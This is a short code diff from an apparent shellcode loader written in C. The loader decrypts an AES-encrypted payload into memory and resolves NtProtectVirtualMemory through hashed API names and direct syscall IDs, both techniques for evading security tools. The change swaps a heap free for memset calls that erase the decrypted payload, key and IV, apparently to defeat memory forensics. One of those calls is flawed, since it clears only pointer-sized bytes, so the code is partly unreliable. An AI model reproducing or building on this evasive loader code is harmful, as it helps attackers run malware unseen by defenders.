@@ -53,7 +53,8 @@ int main()
     PBYTE pPayloadBytes;
     SIZE_T sPayloadSize;
 
-    PVOID ctPayload = NULL, ptPayload = NULL;
+    PVOID ctPayload = NULL;
+    PVOID ptPayload = NULL;
     DWORD dwptPayloadSize = NULL;
     BYTE ctAesKey[KEY_SIZE] = { 0 };
     BYTE ctAesIv[IV_SIZE] = { 0 };
@@ -100,7 +101,10 @@ int main()
 
     _memcpy(currentVmBase, ptPayload, szWmResv);
 
-    HeapFree(GetProcessHeap(), 0, ptPayload);
+    memset(ptPayload, '\0', dwptPayloadSize);
+    memset(ctPayload, '\0', sizeof(ctPayload));
+    memset(ctAesKey, '\0', KEY_SIZE);
+    memset(ctAesIv, '\0', IV_SIZE);
 
     DWORD oldProt;
     GetSyscallId(hNtdll, &SyscallId, NtProtectVirtualMemory_JOAA);
